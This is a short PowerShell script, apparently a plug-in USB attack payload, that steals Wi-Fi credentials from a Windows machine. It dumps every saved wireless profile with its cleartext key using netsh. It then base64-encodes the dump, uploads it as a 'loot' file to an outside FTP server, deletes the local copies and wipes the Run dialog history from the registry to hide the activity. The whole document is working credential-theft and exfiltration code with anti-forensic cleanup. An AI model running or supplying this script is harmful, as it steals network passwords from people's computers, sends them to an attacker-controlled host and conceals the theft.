$currentUser = $env:USERNAME
$File="C:\Users\"+$currentUser +"\w.txt"
$EFile = "C:\Users\"+$currentUser +"\ew.txt"
$out = $currentUser + "_w1f1.loot"
netsh wlan show profiles name=* key=clear | Out-File -Force -FilePath $File


# Read the content from the input file
$content = Get-Content $File -raw 

# Encode the content
$encodedContent = [System.Convert]::ToBase64String([System.Text.Encoding]::utf8.GetBytes($content))

# Write the encoded content to the output file
$encodedContent | Out-File -FilePath $Efile 


# Set remote directory path
$remoteDirectoryPath = "/WIFI/"

$localFilePath = $Efile


# Create FTP session
$ftpSession = New-Object -TypeName System.Net.WebClient
$ftpSession.Credentials = New-Object -TypeName System.Net.NetworkCredential($ftpUsername, $ftpPassword)

try {
    # Set FTP server URI
    $ftpUri = "ftp://$ftpServer$remoteDirectoryPath$out" 

    # Upload file
    $ftpSession.UploadFile($ftpUri, $EFile)
 
}
catch {
    Write-Host "An error occurred while uploading the file: $_"
}
finally {$ftp
    # Dispose FTP session
    $ftpSession.Dispose()

#Clear
rm $File
rm $Efile

}
#Delete Run history
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

